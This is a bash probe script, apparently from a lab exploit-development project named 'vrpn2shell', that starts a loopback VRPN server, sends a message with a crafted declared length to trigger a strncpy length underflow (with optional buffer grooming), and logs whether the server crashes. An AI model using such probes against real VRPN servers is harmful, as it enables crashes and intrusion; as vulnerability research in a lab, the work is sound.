#!/usr/bin/env bash
# W24: launch a plant-started loopback VRPN server and send a short wire
# message with a declared body length. Declared 24 => payload_len 0 and the
# strncpy length underflows. Optional grooming fills the reused receive
# buffer with chosen non-NUL bytes first.
# Usage: probe-underflow.sh <outdir> <port> [groom_bytes]
# Env: BIN, MSGTYPE, DECLARED, HOLD, PRE, BODY, ASAN
set -uo pipefail
OUT=${1:?usage: probe-underflow.sh <outdir> <port> [groom_bytes]}
PORT=${2:?port required}
GROOM=${3:-0}
BIN=${BIN:-lab/frontier/vrpn2shell/build-plain-07.36/server_src/vrpn_server}
MSGTYPE=${MSGTYPE:--1}
DECLARED=${DECLARED:-24}
HOLD=${HOLD:-2.0}
PRE=${PRE:-0.3}
BODY=${BODY:-}

cd "$(dirname "$0")/../../.." || exit 2
mkdir -p "$OUT"
{
  echo "date_utc=$(date -u +%FT%TZ)"
  echo "bin=$BIN"
  echo "bin_sha256=$(sha256sum "$BIN")"
  echo "port=$PORT groom=$GROOM msgtype=$MSGTYPE declared=$DECLARED hold=$HOLD"
} >"$OUT/meta.txt"

if [[ ${ASAN:-0} == 1 ]]; then
  ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 "$BIN" -f lab/frontier/vrpn2shell/vrpn.cfg "$PORT" \
    >"$OUT/server.out" 2>"$OUT/server.err" &
else
  "$BIN" -f lab/frontier/vrpn2shell/vrpn.cfg "$PORT" \
    >"$OUT/server.out" 2>"$OUT/server.err" &
fi
SPID=$!
sleep 2
if ! kill -0 "$SPID" 2>/dev/null; then
  wait "$SPID" 2>/dev/null
  echo "status=START_FAILED exit=$?" >>"$OUT/meta.txt"
  exit 2
fi

python3 lab/frontier/vrpn2shell/wire_underflow.py \
  --port "$PORT" --groom "$GROOM" --declared "$DECLARED" \
  --msgtype "$MSGTYPE" --hold "$HOLD" --presleep "$PRE" --body "$BODY" \
  >"$OUT/client.txt" 2>&1
sleep 2

if kill -0 "$SPID" 2>/dev/null; then
  echo "status=ALIVE_AFTER_MESSAGE" >>"$OUT/meta.txt"
  kill "$SPID" 2>/dev/null
  wait "$SPID" 2>/dev/null
else
  wait "$SPID" 2>/dev/null
  echo "status=DEAD_AFTER_MESSAGE exit=$?" >>"$OUT/meta.txt"
fi
echo "=== $OUT"; cat "$OUT/meta.txt"
echo "--- client"; cat "$OUT/client.txt"
echo "--- server stderr (last 20)"; tail -n 20 "$OUT/server.err"
